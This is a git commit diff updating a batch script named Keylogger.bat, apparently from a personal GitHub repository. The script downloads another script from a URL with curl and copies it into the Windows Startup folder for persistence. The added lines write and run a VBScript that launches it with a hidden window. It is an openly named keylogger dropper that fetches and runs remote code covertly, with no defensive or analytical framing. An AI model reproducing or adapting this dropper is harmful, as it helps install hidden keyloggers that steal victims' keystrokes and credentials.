5a649828312e951f359acda509cd9f706e41a924
iMakeStuff <105526428+iMakeStuff69420@users.noreply.github.com>
2023-07-05 21:22:20 -0400

    Update Keylogger.bat

--- Keylogger.bat
+++ Keylogger.bat
@@ -1,8 +1,14 @@
 @echo off
 
-set url=https://raw.githubusercontent.com/iMakeStuff69420/Keylogger/main/Script
+set url=YOUR_GITHUB_RAW_URL
 set outputFile=script.bat
+set vbsScript=run.vbs
 set startupFolder="%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 curl -o %outputFile% %url%
 copy %outputFile% %startupFolder%
+
+echo Set objShell = WScript.CreateObject("WScript.Shell") > %vbsScript%
+echo objShell.Run "%startupFolder%\%outputFile%", 0, True >> %vbsScript%
+
+cscript /nologo %vbsScript%
